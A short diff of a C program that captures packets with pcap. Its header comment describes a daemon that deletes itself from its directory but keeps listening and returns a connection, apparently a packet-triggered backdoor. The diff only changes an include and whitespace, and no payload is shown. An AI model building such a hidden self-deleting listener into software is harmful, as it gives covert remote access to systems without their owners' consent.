@@ -9,7 +9,8 @@
 *				- If daemonized, deletes itself from directory but still listens and returns connection!
 */
 
-#include "backHelper.h"
+#include "functionality.h"
+
 
 int main(int argc, char **argv){
 	char *dev = NULL;					/* capture device name */
@@ -88,7 +89,7 @@ int main(int argc, char **argv){
 		exit(EXIT_FAILURE);
 	}
 
-	
+
 	/* now we can set our callback function. INFINITE Loop if num_pckt=-1*/
 	pcap_loop(handle, num_packets, got_packet, NULL);
 
